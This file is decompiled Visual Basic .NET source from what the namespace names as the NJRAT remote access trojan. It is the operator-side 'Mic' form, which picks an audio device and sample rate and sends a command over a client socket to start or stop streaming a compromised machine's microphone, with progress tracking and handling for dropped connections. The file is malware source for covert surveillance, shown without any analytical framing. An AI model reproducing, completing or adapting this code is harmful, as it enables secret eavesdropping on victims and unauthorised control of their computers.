Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000017 RID: 23
	<DesignerGenerated()>
	Public Partial Class Mic
		Inherits Form

		' Token: 0x0600033E RID: 830 RVA: 0x0001C7E0 File Offset: 0x0001A9E0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Mic.__ENCList
			SyncLock _ENCList
				If Mic.__ENCList.Count = Mic.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Mic.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Mic.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Mic.__ENCList(num) = Mic.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Mic.__ENCList.RemoveRange(num, Mic.__ENCList.Count - num)
					Mic.__ENCList.Capacity = Mic.__ENCList.Count
				End If
				Mic.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700012D RID: 301
		' (get) Token: 0x06000341 RID: 833 RVA: 0x0001CD4C File Offset: 0x0001AF4C
		' (set) Token: 0x06000342 RID: 834 RVA: 0x0000300B File Offset: 0x0000120B
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x1700012E RID: 302
		' (get) Token: 0x06000343 RID: 835 RVA: 0x0001CD64 File Offset: 0x0001AF64
		' (set) Token: 0x06000344 RID: 836 RVA: 0x0001CD7C File Offset: 0x0001AF7C
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012F RID: 303
		' (get) Token: 0x06000345 RID: 837 RVA: 0x0001CDD4 File Offset: 0x0001AFD4
		' (set) Token: 0x06000346 RID: 838 RVA: 0x0001CDEC File Offset: 0x0001AFEC
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				If Me._vmethod_4 IsNot Nothing Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				If Me._vmethod_4 IsNot Nothing Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000130 RID: 304
		' (get) Token: 0x06000347 RID: 839 RVA: 0x0001CE44 File Offset: 0x0001B044
		' (set) Token: 0x06000348 RID: 840 RVA: 0x00003014 File Offset: 0x00001214
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000131 RID: 305
		' (get) Token: 0x06000349 RID: 841 RVA: 0x0001CE5C File Offset: 0x0001B05C
		' (set) Token: 0x0600034A RID: 842 RVA: 0x0000301D File Offset: 0x0000121D
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox2 = value
			End Set
		End Property

		' Token: 0x17000132 RID: 306
		' (get) Token: 0x0600034B RID: 843 RVA: 0x0001CE74 File Offset: 0x0001B074
		' (set) Token: 0x0600034C RID: 844 RVA: 0x00003026 File Offset: 0x00001226
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x0600034D RID: 845 RVA: 0x0001CE8C File Offset: 0x0001B08C
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Mic_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Mic_Load
			Mic.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600034E RID: 846 RVA: 0x0001CEDC File Offset: 0x0001B0DC
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) = 0 Then
				Me.Button1.Text = "Stop"
				Me.Button1.Image = Resources.control_pause_blue
				Me.ComboBox1.Enabled = False
				Me.ComboBox2.Enabled = False
				Dim value As Integer = 0
				If Me.ComboBox2.Text.Contains("16bit") Then
					value = 1
				End If
				Me.sk.Send(String.Concat(New String() { "~", Class7.string_1, Me.ComboBox1.SelectedIndex.ToString(), Class7.string_1, Conversions.ToString(CInt(Math.Round(Math.Round(Conversions.ToDouble(Me.ComboBox2.Text.Split(New Char() { " "c })(0)) * 1024.0)))), Class7.string_1, Conversions.ToString(value) }))
			Else
				Me.sk.Send("~" + Class7.string_1 + "-1")
				Me.Button1.Image = Resources.control_play_blue
				Me.Button1.Text = "Start"
				Me.ComboBox1.Enabled = True
				Me.ComboBox2.Enabled = True
			End If
		End Sub

		' Token: 0x0600034F RID: 847 RVA: 0x0001D050 File Offset: 0x0001B250
		Private Sub Mic_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				If Me.sk.CN Then
					Me.sk.Send("~" + Class7.string_1 + "-1")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000350 RID: 848 RVA: 0x0001D0C4 File Offset: 0x0001B2C4
		Private Sub Mic_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Class6.smethod_17(0L) + " " + Me.QQ
			Catch ex As Exception
			End Try
			If Me.ComboBox1.Items.Count = 0 Then
				Me.Close()
			Else
				Me.Button1.ImageAlign = ContentAlignment.MiddleLeft
				Me.Button1.Image = Resources.control_play_blue
				Me.ComboBox1.SelectedIndex = 0
				If Class7.class8_0.int_1 > Me.ComboBox2.Items.Count - 1 Then
					Class7.class8_0.int_1 = 0
				End If
				Me.ComboBox2.SelectedIndex = Class7.class8_0.int_1
				If Class7.class8_0.bool_8 Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			End If
		End Sub

		' Token: 0x06000351 RID: 849 RVA: 0x0001D1F0 File Offset: 0x0001B3F0
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				If Me.osk Is Nothing Or Me.sk Is Nothing Then
					Me.Close()
					Return
				End If
				If Not Me.osk.CN Or Not Me.sk.CN Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x04000185 RID: 389
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000187 RID: 391
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000188 RID: 392
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000189 RID: 393
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x0400018A RID: 394
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x0400018B RID: 395
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x0400018C RID: 396
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x0400018D RID: 397
		Public osk As Client

		' Token: 0x0400018E RID: 398
		Public QQ As String

		' Token: 0x0400018F RID: 399
		Public sk As Client
	End Class
End Namespace
